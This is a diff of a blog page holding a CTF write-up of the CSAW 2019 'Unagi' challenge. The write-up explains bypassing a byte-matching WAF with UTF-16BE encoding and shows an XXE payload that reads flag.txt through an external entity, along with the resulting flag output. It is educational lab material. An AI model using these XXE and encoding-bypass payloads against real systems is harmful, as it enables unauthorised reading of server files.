@@ -15,7 +15,7 @@ This was among the first of the challenges I did while under my team, Maple Baco
 
     <title>
         
-            CSAW2019: Unagi :: Jam Polintan 
+            CSAW 2019: Unagi :: Jam Polintan 
         
     </title>
 
@@ -42,12 +42,12 @@ This was among the first of the challenges I did while under my team, Maple Baco
 
 
 
-<meta itemprop="name" content="CSAW2019: Unagi">
+<meta itemprop="name" content="CSAW 2019: Unagi">
 <meta itemprop="description" content="Back in 2019 I really got into CTFs as a matter of honing my security skills. They were fun to do and enriched my knowledge of cybersecurity - so I got into it pretty quickly.
 This was among the first of the challenges I did while under my team, Maple Bacon. At the time, I had plenty experience with SQL injections and XSS attacks, but not nearly enough experience with another common vulnerability: XXE attacks.">
 <meta itemprop="datePublished" content="2020-05-21T01:22:16-06:00" />
 <meta itemprop="dateModified" content="2020-05-21T01:22:16-06:00" />
-<meta itemprop="wordCount" content="822">
+<meta itemprop="wordCount" content="835">
 <meta itemprop="image" content="https://jamvie.net"/>
 
 
@@ -56,13 +56,13 @@ This was among the first of the challenges I did while under my team, Maple Baco
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://jamvie.net"/>
 
-<meta name="twitter:title" content="CSAW2019: Unagi"/>
+<meta name="twitter:title" content="CSAW 2019: Unagi"/>
 <meta name="twitter:description" content="Back in 2019 I really got into CTFs as a matter of honing my security skills. They were fun to do and enriched my knowledge of cybersecurity - so I got into it pretty quickly.
 This was among the first of the challenges I did while under my team, Maple Bacon. At the time, I had plenty experience with SQL injections and XSS attacks, but not nearly enough experience with another common vulnerability: XXE attacks."/>
 
 
 
-    <meta property="og:title" content="CSAW2019: Unagi" />
+    <meta property="og:title" content="CSAW 2019: Unagi" />
 <meta property="og:description" content="Back in 2019 I really got into CTFs as a matter of honing my security skills. They were fun to do and enriched my knowledge of cybersecurity - so I got into it pretty quickly.
 This was among the first of the challenges I did while under my team, Maple Bacon. At the time, I had plenty experience with SQL injections and XSS attacks, but not nearly enough experience with another common vulnerability: XXE attacks." />
 <meta property="og:type" content="article" />
@@ -142,7 +142,7 @@ This was among the first of the challenges I did while under my team, Maple Baco
         </div>
 
         <article>
-            <h2 class="post-title"><a href="https://jamvie.net/post/06csaw2019/">CSAW2019: Unagi</a></h2>
+            <h2 class="post-title"><a href="https://jamvie.net/post/06csaw2019/">CSAW 2019: Unagi</a></h2>
 
             
                 <img src="https://jamvie.net/img/unagi.png" class="post-cover" />
@@ -205,47 +205,47 @@ intro: Bob is cool too
 <p>&hellip;Exotic encodings may also be used to bypass diligent WAFs as they are not always able to process all the encodings listed above. For instance, the libxml2 parser only supports one type of UTF-32 — UTF-32BE, specifically without BOM.</p>
 </blockquote>
 <p>For this issue in particular, UTF-8 and UTF-16 differ in their ways of encoding a sequence of chars. UTF-8&rsquo;s character encodings are 1-4 bytes, while UTF-16&rsquo;s are 2-4. What this challenge&rsquo;s WAF does is look at the byte encoding of a character and match it with whatever blacklist it has. But naturally, UTF-8&rsquo;s character encodings are going to be vastly different from UTF-16&rsquo;s, since there is at least 1 byte of a difference. So when the WAF looks at UTF-16 encodings, it won&rsquo;t be able to detect the malicious characters that is differently encoded in 2 bytes, and assumes the file is clean.</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16BE&quot;?&gt;
-&lt;!DOCTYPE foo [
-	&lt;!ENTITY xxe SYSTEM &quot;file:////flag.txt&quot; &gt;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16BE&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE foo [
+</span><span style="color:#75715e">	&lt;!ENTITY xxe SYSTEM &#34;file:////flag.txt&#34; &gt;</span>
 ]&gt;    
 
-&lt;users&gt;
-    &lt;user&gt;
-        &lt;username&gt;Jam&lt;/username&gt;
-        &lt;password&gt;wordpass&lt;/password&gt;
-        &lt;name&gt;Jam&lt;/name&gt;
-        &lt;email&gt;jam@jelly.com&lt;/email&gt;
-        &lt;group&gt;&amp;xxe;&lt;/group&gt;
-    &lt;/user&gt;
-&lt;/users&gt;
-</code></pre><p>UTF-16 encoding does bypass the WAF but when the flag.txt file is loaded&hellip;</p>
+<span style="color:#f92672">&lt;users&gt;</span>
+    <span style="color:#f92672">&lt;user&gt;</span>
+        <span style="color:#f92672">&lt;username&gt;</span>Jam<span style="color:#f92672">&lt;/username&gt;</span>
+        <span style="color:#f92672">&lt;password&gt;</span>wordpass<span style="color:#f92672">&lt;/password&gt;</span>
+        <span style="color:#f92672">&lt;name&gt;</span>Jam<span style="color:#f92672">&lt;/name&gt;</span>
+        <span style="color:#f92672">&lt;email&gt;</span>jam@jelly.com<span style="color:#f92672">&lt;/email&gt;</span>
+        <span style="color:#f92672">&lt;group&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/group&gt;</span>
+    <span style="color:#f92672">&lt;/user&gt;</span>
+<span style="color:#f92672">&lt;/users&gt;</span>
+</code></pre></div><p>UTF-16 encoding does bypass the WAF but when the flag.txt file is loaded&hellip;</p>
 <pre><code>name: Jam
 email: jam@jelly.com
 group: AAAAAAAAAAAAAAAAAAAA
 </code></pre><p>It&rsquo;s cut off, probably cause the &ldquo;group&rdquo; field has a character limit. But interestingly enough, the xml sample file doesn&rsquo;t specify a field we saw before - <code>intro</code>. Could we just put our xxe attack in there?</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16BE&quot;?&gt;
-&lt;!DOCTYPE foo [
-	&lt;!ENTITY xxe SYSTEM &quot;file:////flag.txt&quot; &gt;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16BE&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE foo [
+</span><span style="color:#75715e">	&lt;!ENTITY xxe SYSTEM &#34;file:////flag.txt&#34; &gt;</span>
 ]&gt;    
 
-&lt;users&gt;
-    &lt;user&gt;
-        &lt;username&gt;Jam&lt;/username&gt;
-        &lt;password&gt;wordpass&lt;/password&gt;
-        &lt;name&gt;Jam&lt;/name&gt;
-        &lt;email&gt;jam@jelly.com&lt;/email&gt;
-        &lt;group&gt;Fruit Preservatives&lt;/group&gt;
-        &lt;intro&gt;&amp;xxe;&lt;/intro&gt;
-    &lt;/user&gt;
-&lt;/users&gt;
-</code></pre><p>It works!</p>
+<span style="color:#f92672">&lt;users&gt;</span>
+    <span style="color:#f92672">&lt;user&gt;</span>
+        <span style="color:#f92672">&lt;username&gt;</span>Jam<span style="color:#f92672">&lt;/username&gt;</span>
+        <span style="color:#f92672">&lt;password&gt;</span>wordpass<span style="color:#f92672">&lt;/password&gt;</span>
+        <span style="color:#f92672">&lt;name&gt;</span>Jam<span style="color:#f92672">&lt;/name&gt;</span>
+        <span style="color:#f92672">&lt;email&gt;</span>jam@jelly.com<span style="color:#f92672">&lt;/email&gt;</span>
+        <span style="color:#f92672">&lt;group&gt;</span>Fruit Preservatives<span style="color:#f92672">&lt;/group&gt;</span>
+        <span style="color:#f92672">&lt;intro&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/intro&gt;</span>
+    <span style="color:#f92672">&lt;/user&gt;</span>
+<span style="color:#f92672">&lt;/users&gt;</span>
+</code></pre></div><p>It works!</p>
 <pre><code>name: Jam
 email: jam@jelly.com
 group: Fruit Preservatives
 intro: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag{n0w_i'm_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 </code></pre><hr>
-<p>Looking back at CSAW 2019 now, it&rsquo;s almost obvious that the attack vector here was an XXE. Of course, being young and somewhat new to the collective CTF scene I wouldn&rsquo;t have figured this out from the get-go. It feels nice to know that I have grown and evolved as a CTF hacker, and I will continue to do so. Each CTF I participate in teaches me something new, so hopefully if anyone reads this and feels uncertain about how much they don&rsquo;t know, spin it around and see it as an oppurtunity of how much you can learn :) Anyway, this was a quick writeup I did based on my year-old notes on this challenge, so I apologize for the lack of screenshots and otherwise simple presentation of it. This coming weekend, I will be participating in a few different CTFs, so expect more writeups to come soon!</p>
+<p>Looking back at CSAW 2019 now, it&rsquo;s almost obvious that the attack vector here was an XXE. Of course, being young and somewhat new to the collective CTF scene I wouldn&rsquo;t have figured this out from the get-go. It feels nice to know that I have grown and evolved as a CTF hacker, and I will continue to do so. Each CTF I participate in teaches me something new, and I will continue to grow and evolve as I participate in mroe CTFs. Hopefully if anyone reads this and feels uncertain about how much they don&rsquo;t know, spin it around and see it as an oppurtunity of how much you can learn :) Anyway, this was a quick writeup I did based on my year-old notes on this challenge, so I apologize for the lack of screenshots and otherwise simple presentation of it. This coming weekend, I will be participating in a few different CTFs, so expect more writeups to come soon!</p>
 <p>Jam</p>
 <hr>
 <p>References</p>
